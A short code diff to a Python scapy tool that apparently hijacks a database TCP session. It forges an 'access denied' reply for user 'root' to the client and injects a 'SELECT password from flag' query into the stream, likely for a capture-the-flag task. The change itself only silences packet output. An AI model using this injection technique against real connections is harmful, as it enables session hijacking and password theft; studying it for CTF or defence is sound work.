@@ -142,16 +142,20 @@ class Protocol:
 			self.trick = True
 			# send response error to client
 			self.forge.layout_srv[scapy.TCP].ack = self.forge.layout_srv[scapy.TCP].ack + len(pkt[scapy.TCP].load)
-			scapy.sendp(self.forge.layout_srv)
+			scapy.sendp(self.forge.layout_srv,
+				verbose=False)
 			self.forge.layout_srv[scapy.TCP].flags = 'PA'
 			scapy.sendp(self.forge.layout_srv / self.forge.deny(
 				self.forge.access_denied('root', self.forge.client.ip, False)
-				)
+				),
+				verbose=False
 			)
 		elif self.events.psh >= 3:
 			self.forge.layout_cli.seq = pkt[scapy.TCP].ack
 			self.forge.layout_cli.ack = pkt[scapy.TCP].seq + len(pkt[scapy.TCP].load)
-			scapy.sendp(self.forge.layout_cli / self.forge.query('SELECT password from flag'))
+			scapy.sendp(self.forge.layout_cli / self.forge.query('SELECT password from flag'),
+				verbose=False
+			)
 
 	def send_request(self, name, pkt):
 		True
